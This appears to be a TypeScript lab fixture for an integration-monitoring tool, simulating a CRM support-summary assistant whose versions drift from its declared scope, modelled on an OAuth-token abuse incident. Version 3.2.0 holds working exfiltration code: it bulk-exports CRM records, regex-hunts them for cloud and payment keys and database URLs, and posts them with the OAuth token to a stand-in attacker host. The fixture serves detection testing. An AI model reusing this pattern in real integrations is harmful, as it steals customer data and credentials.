/**
 * helpdesk-copilot: LAB FIXTURE, a planted test case for Mole's integration trials. Not a real product.
 *
 * An "AI chat assistant for your CRM": the customer connects it with OAuth so it can summarize open support cases.
 * It declares one job and one scope: read Case, write CaseComment, and send case text to its own API
 * (api.helpdesk-copilot.example) for summarizing.
 *
 * Its version history is shaped like the Salesloft Drift incident (Aug 2025), where an AI chat integration's OAuth
 * tokens were used to bulk-query Salesforce objects (User, Account, Case, Opportunity) and hunt the results for AWS
 * keys and other secrets:
 *   3.1.0  does its job: reads open cases, sends case text to its own API, writes a summary comment back.
 *   3.1.5  also reads every Contact "to personalize replies": more data than it declared. Nothing extra leaves.
 *   3.2.0  bulk-exports User, Account, Contact, Opportunity and every Case, greps them for keys, and ships it all
 *          to an undeclared host.
 *
 * Env: TENANT_URL, TENANT_TOKEN (OAuth bearer), MOLE_FIXTURE_VERSION. Runs one task and exits.
 * Under Mole, every outside call is logged and answered locally (the observer's contain mode); the hosts are under
 * the reserved .example TLD, so nothing could reach a real destination anyway.
 */
const version = process.env.MOLE_FIXTURE_VERSION ?? "3.2.0";
const [, minor, patch] = version.split(".").map(Number) as [number, number, number];
const base = `${process.env.TENANT_URL}/services/data/v60.0`;
const auth = { authorization: `Bearer ${process.env.TENANT_TOKEN}` };

async function soql(q: string): Promise<Record<string, unknown>[]> {
  const r = await fetch(`${base}/query?q=${encodeURIComponent(q)}`, { headers: auth });
  if (!r.ok) return [];
  return ((await r.json()) as { records: Record<string, unknown>[] }).records;
}

async function post(url: string, body: unknown): Promise<void> {
  await fetch(url, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(body) }).catch(() => undefined);
}

async function main(): Promise<void> {
  // The declared job.
  const cases = await soql("SELECT Id, CaseNumber, Subject, Description, Status FROM Case WHERE Status = 'Open'");
  let contacts: Record<string, unknown>[] = [];
  if (minor > 1 || (minor === 1 && patch >= 5)) {
    // 3.1.5+: quietly widens what it reads.
    contacts = await soql("SELECT Id, FirstName, LastName, Email, Phone FROM Contact");
  }
  const summaryReq = { cases: cases.map((c) => ({ subject: c.Subject, text: c.Description })), tone: "concise" };
  await post("https://api.helpdesk-copilot.example/v1/summarize", summaryReq);
  for (const c of cases) {
    await fetch(`${base}/sobjects/CaseComment`, {
      method: "POST", headers: { ...auth, "content-type": "application/json" },
      body: JSON.stringify({ ParentId: c.Id, CommentBody: `Copilot summary: ${String(c.Subject)} (${contacts.length ? "personalized" : "standard"})` }),
    });
  }

  if (minor >= 2) {
    // 3.2.0: the bulk export.
    const dump: Record<string, unknown[]> = {};
    for (const obj of ["User", "Account", "Contact", "Opportunity", "Case"]) dump[obj] = await soql(`SELECT FIELDS(ALL) FROM ${obj} LIMIT 200`);
    const secrets = JSON.stringify(dump).match(/AKIA[0-9A-Z]{16}|sk_live_[0-9A-Za-z]{20,}|postgres:\/\/[^"\s]+/g) ?? [];
    await post("http://sync.copilot-telemetry.example/ingest", { org: process.env.TENANT_URL, token: process.env.TENANT_TOKEN, secrets, dump });
  }
}

main().then(() => process.exit(0), () => process.exit(1));
